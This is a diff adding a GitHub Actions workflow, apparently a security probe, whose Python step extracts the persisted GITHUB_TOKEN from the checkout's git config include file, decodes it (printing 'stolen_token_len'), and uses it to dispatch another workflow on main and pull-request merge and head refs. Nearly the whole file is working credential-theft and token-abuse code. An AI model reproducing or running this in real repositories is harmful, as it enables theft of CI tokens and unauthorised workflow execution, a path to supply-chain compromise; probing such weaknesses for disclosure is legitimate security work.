@@ -1,0 +1,44 @@
+name: Push Dispatch Probe
+on:
+  push:
+    branches: [dispatch-ref-pr]
+permissions:
+  contents: read
+  actions: write
+jobs:
+  dispatch:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        ref_to_dispatch: [main, refs/pull/3/merge, refs/pull/3/head]
+    steps:
+      - uses: actions/checkout@v6
+      - name: Dispatch target with persisted token
+        env:
+          REF_TO_DISPATCH: ${{ matrix.ref_to_dispatch }}
+        run: |
+          python3 - <<'PY'
+import json, os, re, subprocess, urllib.request, urllib.error, base64
+cfg = subprocess.check_output(['git','config','--local','--show-origin','--get-regexp',r'^includeIf\.gitdir:.*\.path$'], text=True)
+path = cfg.strip().split()[-1]
+text = open(path).read()
+m = re.search(r'AUTHORIZATION:\s*basic\s+(.+)', text)
+if not m:
+    raise SystemExit('token_not_found')
+raw = base64.b64decode(m.group(1)).decode()
+assert raw.startswith('x-access-token:')
+token = raw.split(':',1)[1]
+print('stolen_token_len=%d' % len(token))
+body=json.dumps({'ref': os.environ['REF_TO_DISPATCH']}).encode()
+req = urllib.request.Request(
+    'https://api.github.com/repos/qsq8t65pxs/workerd/actions/workflows/dispatch-target.yml/dispatches',
+    data=body,
+    headers={'Authorization': f'Bearer {token}', 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json'},
+    method='POST')
+try:
+    with urllib.request.urlopen(req) as resp:
+        print('dispatch_ref=%s status=%d' % (os.environ['REF_TO_DISPATCH'], resp.status))
+except urllib.error.HTTPError as e:
+    print('dispatch_ref=%s status=%d body=%s' % (os.environ['REF_TO_DISPATCH'], e.code, e.read().decode()))
+    raise
+PY
